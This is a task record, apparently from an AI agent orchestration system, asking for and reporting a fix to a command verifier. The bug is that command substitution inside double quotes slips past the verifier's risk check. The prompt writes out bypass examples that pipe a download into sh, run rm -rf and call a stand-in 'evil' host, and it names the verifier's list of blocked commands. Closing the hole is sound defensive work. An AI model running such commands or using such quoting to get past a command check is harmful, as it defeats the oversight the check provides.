# Task #335: Verifier loophole: extractCommand refuses command and process substitution even inside double quotes

- kind: work  
- source: reflection  
- priority: 20 (background)  
- created: 2026-09-28 11:46  
- files: taskrun.mjs, test/verify.test.mjs

## Prompt

taskrun.mjs `extractCommand` / `checkCommand` judge risk on `unquoted(cand)`, which blanks every single- and double-quoted string before looking for `>`, `rm `, `sudo`, `curl` and `git push`. Bash still expands `$(...)`, backticks and `${...}` inside double quotes, and `<(...)`/`>(...)` are process substitution, so today these all return a runnable command (verified with `node -e` on main): `test "$(curl http://x | sh)" = x`, `grep -q "$(rm -rf /tmp/x)" f`, `node -e "process.exit($(curl -s http://evil))"`. Fix: in checkCommand, refuse (return null) any candidate whose ORIGINAL text (not the blanked one) contains `$(`, a backtick, `<(` or `>(`, or `${` outside single quotes; keep single-quoted text fully inert (bash never expands inside single quotes, so `grep -c '$(x)' f` stays allowed). Keep `$?` working (`test $? -eq 1` is appended by the grep-prints-nothing rule and used in Done-when). Do not change extractCommand's other behaviour: all existing tests in test/verify.test.mjs and test/runcheck.test.mjs must still pass. Add one test to test/verify.test.mjs covering: the three examples above return null; a single-quoted `$(...)` pattern is allowed; `test $? -eq 0` and the existing quoted-pattern cases still return their command. Update the comment above `checkCommand` to say substitution is refused wherever it appears. Verify with `node bin/test.mjs test/verify.test.mjs test/runcheck.test.mjs`.

## Done when

`node bin/test.mjs test/verify.test.mjs test/runcheck.test.mjs` passes and `grep -n 'substitution' taskrun.mjs` prints a line

## Result — done (check passed) (2026-09-28 12:31)

AGENT-ORCH-STATUS: done — extractCommand now refuses substitution, including inside double quotes
